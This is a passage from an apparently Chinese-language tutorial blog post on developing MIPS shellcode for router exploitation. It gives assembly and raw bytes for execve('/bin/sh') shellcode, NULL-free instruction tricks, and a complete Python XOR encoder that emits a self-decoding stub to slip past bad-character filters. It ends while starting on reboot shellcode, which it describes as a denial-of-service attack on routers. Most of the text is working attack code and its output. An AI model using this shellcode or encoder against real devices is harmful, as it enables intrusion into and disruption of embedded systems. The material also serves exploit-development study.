 searchCode = args.search</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> createCode <span class="keyword">and</span> (<span class="number">0</span> &lt; args.length &lt;= <span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">        <span class="comment">#eg:  -c -l 90</span></span><br><span class="line">        generate(length,output)</span><br><span class="line">    <span class="keyword">elif</span> searchCode <span class="keyword">and</span> (<span class="number">0</span> &lt; args.length &lt;= <span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">        <span class="comment">#eg: -s 0x474230141</span></span><br><span class="line">        patternMatch(searchCode,length)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] You shoud chices from [-c -s]&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Pattern length must be less than 6760&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;more help: pattern.py -h&#x27;</span>)</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="基于MIPS的Shellcode开发"><a href="#基于MIPS的Shellcode开发" class="headerlink" title="基于MIPS的Shellcode开发"></a>基于MIPS的Shellcode开发</h2><h3 id="MIPS-Linux系统调用"><a href="#MIPS-Linux系统调用" class="headerlink" title="MIPS Linux系统调用"></a>MIPS Linux系统调用</h3><p>syscall的调用方法:  <code>$v0</code>保存需要执行的系统调用的编号</p><p>伪代码<code>syscall($v0, $a0, $a1, $a2....)</code></p><p>源码 <strong>exit</strong>系统调用**exit(code)**的例子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">li $a0, 0 # code</span><br><span class="line">li $v0, 4001 # exit系统调用号</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h3 id="write系统调用"><a href="#write系统调用" class="headerlink" title="write系统调用"></a>write系统调用</h3><p><strong>C语言代码:</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *pstr = <span class="string">&quot;ABC\n&quot;</span>;</span><br><span class="line">    write(<span class="number">1</span>, pstr, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>汇编代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global __start</span><br><span class="line">.set noreorder</span><br><span class="line"></span><br><span class="line">__start:</span><br><span class="line">addiu $sp, $sp, -32</span><br><span class="line">lui $t6, 0x4142</span><br><span class="line">ori $t6, $t6, 0x430a</span><br><span class="line">sw $t6, 0($sp)</span><br><span class="line">li $a0, 1</span><br><span class="line">addiu $a1, $sp, 0</span><br><span class="line">li $a2, 5</span><br><span class="line">li $v0, 4004</span><br><span class="line">syscall</span><br><span class="line">li $a0, 0</span><br><span class="line">li $v0, 4001</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><strong>MIPS编译脚本 nasm.sh</strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/zsh</span></span><br><span class="line"><span class="comment"># $ zsh nasm.sh &lt;source file&gt; &lt;excute file&gt;</span></span><br><span class="line">src=<span class="variable">$1</span></span><br><span class="line">dst=<span class="variable">$2</span></span><br><span class="line">mips-linux-gnu-as <span class="variable">$src</span> -o a.o</span><br><span class="line">mips-linux-gnu-ld a.o -o <span class="variable">$dst</span></span><br><span class="line">rm a.o</span><br></pre></td></tr></table></figure><p>编译运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  write_syscall zsh nasm.sh write.s write</span><br><span class="line">➜  write_syscall qemu-mips write</span><br><span class="line">ABC</span><br><span class="line">qemu: uncaught target signal 4 (Illegal instruction) - core dumped</span><br><span class="line">[1]    11304 illegal hardware instruction  qemu-mips write</span><br></pre></td></tr></table></figure><p>加以改进</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global __start</span><br><span class="line">.set noreorder</span><br><span class="line"></span><br><span class="line">__start:</span><br><span class="line">addiu $sp, $sp, -32</span><br><span class="line">lui $t6, 0x4142</span><br><span class="line">ori $t6, $t6, 0x430a</span><br><span class="line">sw $t6, 0($sp)</span><br><span class="line">li $a0, 1</span><br><span class="line">addiu $a1, $sp, 0</span><br><span class="line">li $a2, 5</span><br><span class="line">li $v0, 4004</span><br><span class="line">syscall</span><br><span class="line">li $a0, 0 # code</span><br><span class="line">li $v0, 4001 # exit系统调用号</span><br><span class="line">syscall # 调用exit(0)</span><br></pre></td></tr></table></figure><p>编译运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  write_syscall zsh nasm.sh write.s write</span><br><span class="line">➜  write_syscall qemu-mips write</span><br><span class="line">ABC</span><br></pre></td></tr></table></figure><h3 id="execve系统调用"><a href="#execve系统调用" class="headerlink" title="execve系统调用"></a>execve系统调用</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> *<span class="keyword">const</span> argv[]. <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure><p><strong>C 语言中完整execve系统调用代码</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *program = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *arg = <span class="string">&quot;-1&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *args[<span class="number">3</span>];</span><br><span class="line">args[<span class="number">0</span>] = program;</span><br><span class="line">args[<span class="number">1</span>] = arg;</span><br><span class="line">args[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">execve(program, args, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>C语言 execve(“/bin/sh”)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>execve 执行/bin/sh汇编代码</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line"></span><br><span class="line">__start:</span><br><span class="line">li $a2,0x111</span><br><span class="line">p:bltzal $a2,p</span><br><span class="line">li $a2,0</span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">addiu $a0,$ra,28</span><br><span class="line">sw $a0,-24($sp)</span><br><span class="line">sw $zero,-20($sp)</span><br><span class="line">addiu $a1,$sp,-24</span><br><span class="line">li $v0,4011</span><br><span class="line">syscall</span><br><span class="line">sc:</span><br><span class="line">    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</span><br></pre></td></tr></table></figure><p>编译运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  shellcode zsh nasm.sh execve.S execve</span><br><span class="line">➜  shellcode qemu-mips execve</span><br><span class="line">$ ls</span><br><span class="line">execve  execve.S  nasm.sh</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p><strong>execve 执行/bin/sh的汇编代码</strong></p><p>可以通过pwntools获得机器码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;big&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">li $a2,0x111</span></span><br><span class="line"><span class="string">p:bltzal $a2,p</span></span><br><span class="line"><span class="string">li $a2,0</span></span><br><span class="line"><span class="string">addiu $sp,$sp,-32</span></span><br><span class="line"><span class="string">addiu $a0,$ra,28</span></span><br><span class="line"><span class="string">sw $a0,-24($sp)</span></span><br><span class="line"><span class="string">sw $zero,-20($sp)</span></span><br><span class="line"><span class="string">addiu $a1,$sp,-24</span></span><br><span class="line"><span class="string">li $v0,4011</span></span><br><span class="line"><span class="string">syscall </span></span><br><span class="line"><span class="string">sc:</span></span><br><span class="line"><span class="string">    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shellcode:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\\x<span class="subst">&#123;<span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>&quot;</span>, end =<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>则有</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> *shellcode = <span class="string">&quot;\x24\x06\x01\x11\x04\xd0\xff\xff\x24\x06\x00\x00\x27\xbd\xff\xe0\x27\xe4\x00\x1c\xaf\xa4\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x00\x00\x00\x0c\x2f\x62\x69\x6e\x2f\x73\x68&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> (*s)() = (<span class="keyword">char</span>(*)())shellcode;</span><br><span class="line">    s();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  shellcode mips-linux-gnu-gcc execve.c -o execve</span><br><span class="line">➜  shellcode qemu-mips execve</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">execve  execve.S  execve.c  exp.py  nasm.sh</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><h3 id="Shellcode-编码优化"><a href="#Shellcode-编码优化" class="headerlink" title="Shellcode 编码优化"></a>Shellcode 编码优化</h3><h4 id="指令优化"><a href="#指令优化" class="headerlink" title="指令优化"></a>指令优化</h4><ul><li>避免出现坏字符<ul><li>例如： NULL</li></ul></li></ul><table><thead><tr><th>普通指令</th><th>机器码</th><th>无NULLL指令</th><th>机器码</th></tr></thead><tbody><tr><td>li $a2, 0</td><td>24 06 00 00</td><td>slti $a2, $zero, -1</td><td>28 06 ff ff</td></tr><tr><td>li $a2, 1</td><td>24 04 00 01</td><td>slti $a2, $zero, -1</td><td>2c 04 ff ff</td></tr><tr><td>addiu $a0, $ra, 32</td><td>24 e4 00 20</td><td>addiu $a0, $ra, 4097</td><td>27 e4 10 01</td></tr><tr><td></td><td></td><td>addiu $a0, $a0, -4065</td><td>24 84 f0 1f</td></tr><tr><td>li $a2, 5</td><td>24 06 00 05</td><td>li $t6, -9</td><td>24 0e ff f7</td></tr><tr><td></td><td></td><td>nor $t6, $t6, $zero</td><td>01 c0 70 27</td></tr><tr><td></td><td></td><td>addi $a2, $t6, -3</td><td>21 c6 ff fd</td></tr></tbody></table><p><strong>无NULL的write系统调用 Shellcode</strong></p><p>汇编代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sltiu $a0,$zero,-1</span><br><span class="line">lui $t6,0x4142</span><br><span class="line">ori $t6,$t6,0x430a</span><br><span class="line">sw $t6,-24($sp)</span><br><span class="line">sw $zero,-20($sp)</span><br><span class="line">addiu $a1,$sp,-24</span><br><span class="line">li $t7,-9</span><br><span class="line">nor $t7,$t7,$zero</span><br><span class="line">addi $a2,$t7,-3</span><br><span class="line">li $v0,4004</span><br><span class="line">syscall 0x40404</span><br></pre></td></tr></table></figure><p>获得机器码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;big&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">sltiu $a0,$zero,-1</span></span><br><span class="line"><span class="string">lui $t6,0x4142</span></span><br><span class="line"><span class="string">ori $t6,$t6,0x430a</span></span><br><span class="line"><span class="string">sw $t6,-24($sp)</span></span><br><span class="line"><span class="string">sw $zero,-20($sp)</span></span><br><span class="line"><span class="string">addiu $a1,$sp,-24</span></span><br><span class="line"><span class="string">li $t7,-9</span></span><br><span class="line"><span class="string">nor $t7,$t7,$zero</span></span><br><span class="line"><span class="string">addi $a2,$t7,-3</span></span><br><span class="line"><span class="string">li $v0,4004</span></span><br><span class="line"><span class="string">syscall 0x40404</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shellcode:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\\x<span class="subst">&#123;<span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)&#125;</span>&quot;</span>, end =<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>则有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x2c\x04\xff\xff sltiu $a0,$zero,-1</span><br><span class="line">\x3c\x0e\x41\x42 lui $t6,0x4142</span><br><span class="line">\x35\xce\x43\x0a ori $t6,$t6,0x430a</span><br><span class="line">\xaf\xae\xff\xe8 sw $t6,-24($sp)</span><br><span class="line">\xaf\xa0\xff\xec sw $zero,-20($sp)</span><br><span class="line">\x27\xa5\xff\xe8 addiu $a1,$sp,-24</span><br><span class="line">\x24\x0f\xff\xf7 li $t7,-9</span><br><span class="line">\x01\xe0\x78\x27 nor $t7,$t7,$zero</span><br><span class="line">\x21\xe6\xff\xfd addi $a2,$t7,-3</span><br><span class="line">\x24\x02\x0f\xa4 li $v0,4004</span><br><span class="line">\x01\x01\x01\x0c syscall 0x40404</span><br></pre></td></tr></table></figure><ul><li><code>sltiu $a0,$zero,-1</code>, 将数字1写入<code>$a0</code>, 避免出现<code>NULL</code>字符</li><li>第7行~第11行： 使用3条与赋值、运算相关的指令，避免出现<code>NULL</code>字节，同时实现与运行<code>li $a2, 5</code>命令相同的效果</li></ul><p><strong>无NULL的execve系统调用Shellcode</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">li $a2,1638</span><br><span class="line">p:bltzal $a2,p</span><br><span class="line">slti $a2,$zero,-1</span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">addiu $a0,$ra,4097</span><br><span class="line">addiu $a0,$a0,-4065</span><br><span class="line">sw $a0,-24($sp)</span><br><span class="line">sw $zero,-20($sp)</span><br><span class="line">addiu $a1,$sp,-24</span><br><span class="line">li $v0,4011</span><br><span class="line">syscall 0x40404</span><br><span class="line">sc:</span><br><span class="line">    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</span><br></pre></td></tr></table></figure><h4 id="Shellcode-编码"><a href="#Shellcode-编码" class="headerlink" title="Shellcode 编码"></a>Shellcode 编码</h4><p>避开可能的限制字符0x0D(\r), 0x0A(\n) 或 0x20(Space), 或限制必须为可见字符(ASCII值) 或Unicode值</p><ul><li>Base64</li><li>alpha_uppper<ul><li>编码后使其呈现ASCII可见字符编码</li></ul></li><li>xor编码</li></ul><h5 id="Xor编码实现"><a href="#Xor编码实现" class="headerlink" title="Xor编码实现"></a>Xor编码实现</h5><p><strong>encoder.py</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## encoder: long_xor</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"></span><br><span class="line">bad_bytes = [<span class="number">0</span>]*<span class="number">257</span></span><br><span class="line">good_bytes = []</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">key can&#x27;t in user_bad_bytes</span></span><br><span class="line"><span class="string">slen can&#x27;t contain user_bad_bytes</span></span><br><span class="line"><span class="string">encoder can&#x27;t contain user_bad_bytes</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">header</span>(<span class="params">slen, key, bad_bytes</span>):</span></span><br><span class="line">    encoder = <span class="string">b&quot;\x24\x18\xf9\x9a&quot;</span>  <span class="comment"># li $t8, -0x666</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x07\x10\xff\xff&quot;</span>  <span class="comment"># p:  bltzal $t8, p</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x28\x18\xff\xff&quot;</span>  <span class="comment"># slti $t8, $zero, -1</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x27\xe8\x10\x01&quot;</span>  <span class="comment"># addu $t0, $ra, 4097</span></span><br><span class="line">    <span class="comment"># addu $t0, $t0, -4097+44+len+1</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x25\x08&quot;</span>+struct.pack(<span class="string">&quot;&gt;h&quot;</span>, slen)</span><br><span class="line">    <span class="comment"># lui $t1, 0xXXXX(high)</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x3c\x09&quot;</span>+struct.pack(<span class="string">&quot;&gt;BB&quot;</span>, key[<span class="number">0</span>], key[<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># ori $t1, $t1, 0xXXXX(low)</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x35\x29&quot;</span>+struct.pack(<span class="string">&quot;&gt;BB&quot;</span>, key[<span class="number">2</span>], key[<span class="number">3</span>])</span><br><span class="line">    encoder += <span class="string">b&quot;\x3c\x0b\x01\xe0&quot;</span>  <span class="comment"># lui $t3, 0x01e0</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x35\x6b\x78\x27&quot;</span>  <span class="comment"># ori $t3, $t3, 0x7827</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x8d\x0e\xff\xff&quot;</span>  <span class="comment"># x:  lw $t6, -1($t0)</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x01\xc9\x60\x26&quot;</span>  <span class="comment"># xor $t4, $t6, $t1</span></span><br><span class="line">    encoder += <span class="string">b&quot;\xad\x0c\xff\xff&quot;</span>  <span class="comment"># sw $t4, -1($t0)</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x25\x08\xff\xfc&quot;</span>  <span class="comment"># addu $t0, $t0, -4</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x15\xcb\xff\xfb&quot;</span>  <span class="comment"># bne $t6, $t3, -20</span></span><br><span class="line">    encoder += <span class="string">b&quot;\x01\xe0\x78\x27&quot;</span>  <span class="comment"># nor $t7, $t7, $zero</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> dt <span class="keyword">in</span> bad_bytes:</span><br><span class="line">        <span class="keyword">if</span> encoder.find(dt) &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] Encode failed!&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] contain bad bytes: &#x27;</span>, <span class="built_in">hex</span>(dt))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] You need a new head of decoder!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> encoder</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_c_format</span>(<span class="params">data</span>):</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    line = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> dt <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">0</span> <span class="keyword">and</span> count % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&quot;%s&quot;&#x27;</span> % line)</span><br><span class="line">            line = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        line += <span class="string">&quot;\\x%02x&quot;</span> % dt</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&quot;%s&quot;&#x27;</span> % line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XOR_ENCODER</span>(<span class="params">shellcode, xor_with</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    @ xor_with = (A,B)</span></span><br><span class="line"><span class="string">    long_key = ABAB</span></span><br><span class="line"><span class="string">    long_shell = 1234</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    slong_key = struct.pack(</span><br><span class="line">        <span class="string">&quot;BBBB&quot;</span>, xor_with[<span class="number">0</span>], xor_with[<span class="number">1</span>], xor_with[<span class="number">2</span>], xor_with[<span class="number">3</span>])</span><br><span class="line">    long_key = struct.unpack(<span class="string">&quot;&gt;L&quot;</span>, slong_key)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode)//<span class="number">4</span>):</span><br><span class="line">        code = struct.unpack(<span class="string">&quot;&gt;L&quot;</span>, shellcode[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># print hex(code),i</span></span><br><span class="line">        code = code ^ long_key</span><br><span class="line">        data += struct.pack(<span class="string">&quot;&gt;L&quot;</span>, code)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_key</span>(<span class="params">shellcode, user_bad_bytes</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    @ key can&#x27;t contain in user_bad_bytes</span></span><br><span class="line"><span class="string">    @ because key will write in the head of decoder </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> dt <span class="keyword">in</span> shellcode:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> i ^ dt <span class="keyword">in</span> user_bad_bytes \</span><br><span class="line">               <span class="keyword">or</span> i <span class="keyword">in</span> user_bad_bytes:</span><br><span class="line">                bad_bytes[i] = i</span><br><span class="line">    <span class="comment"># print bad_bytes</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> bad_bytes[i] == <span class="number">0</span>:</span><br><span class="line">            good_bytes.append(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print good_bytes</span></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        key.append(random.choice(good_bytes))</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span>():</span></span><br><span class="line">    exe_name = os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Usage:&#x27;</span>, exe_name, <span class="string">&#x27;[source] [bad bytes]&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\tsource\t\t: source of shellcode byte file&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\tbad bytes\t: bad bytes to encoder&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encoder</span>(<span class="params">srcfile, user_bad_bytes</span>):</span></span><br><span class="line">    fr = <span class="built_in">open</span>(srcfile, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    shellcode = fr.read()  <span class="comment"># source of shellcode data</span></span><br><span class="line">    fr.close()</span><br><span class="line">    slen = <span class="built_in">len</span>(shellcode)  <span class="comment"># shellcode len</span></span><br><span class="line">    padslen = -<span class="number">4097</span> + <span class="number">44</span> + slen + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check head of decoder</span></span><br><span class="line">    code = struct.pack(<span class="string">&quot;&gt;h&quot;</span>, padslen)</span><br><span class="line">    codeH = code[<span class="number">0</span>]</span><br><span class="line">    codeL = code[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> codeH <span class="keyword">in</span> user_bad_bytes <span class="keyword">or</span>\</span><br><span class="line">       codeL <span class="keyword">in</span> user_bad_bytes:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Shellcode Length(0x%x,0x%x) contain user_bad_bytes !&#x27;</span> %</span><br><span class="line">              (codeH, codeL))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Check &amp; Padding Shellcode!&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    xor_with = generate_key(shellcode, user_bad_bytes)</span><br><span class="line">    <span class="comment"># print xor_with</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[t] encoder: long_xor&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n[x] Choose to XOR with [ %s,%s,%s,%s ]&#x27;</span></span><br><span class="line">          % (<span class="built_in">hex</span>(xor_with[<span class="number">0</span>]), <span class="built_in">hex</span>(xor_with[<span class="number">1</span>]), <span class="built_in">hex</span>(xor_with[<span class="number">2</span>]), <span class="built_in">hex</span>(xor_with[<span class="number">3</span>])))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[S] Shellcode: \n&#x27;</span>)</span><br><span class="line">    <span class="comment"># print xor_with</span></span><br><span class="line"></span><br><span class="line">    head = header(padslen, xor_with, user_bad_bytes)</span><br><span class="line">    <span class="keyword">if</span> head:</span><br><span class="line">        shell = XOR_ENCODER(shellcode, xor_with)</span><br><span class="line">        print_c_format(head+shell)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">        usage()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] start encoder ...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        srcfile = <span class="string">&#x27;sc.bin&#x27;</span></span><br><span class="line">        user_bad_bytes = [<span class="number">0x00</span>, <span class="number">0x0d</span>, <span class="number">0x0a</span>, <span class="number">0x20</span>]</span><br><span class="line"></span><br><span class="line">        encoder(srcfile, user_bad_bytes)</span><br></pre></td></tr></table></figure><h3 id="通用Shellcode开发"><a href="#通用Shellcode开发" class="headerlink" title="通用Shellcode开发"></a>通用Shellcode开发</h3><h4 id="reboot-shellcode"><a href="#reboot-shellcode" class="headerlink" title="reboot shellcode"></a>reboot shellcode</h4><ul><li>重启路由器造成拒绝服务攻击</li></ul><p><strong>C 语言reboot</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/reboot.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">reboot(<span class="number">0xfee1dead</span>, <span class="number">0x28121969</span>, <span class="number">0x4321fedc</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>man 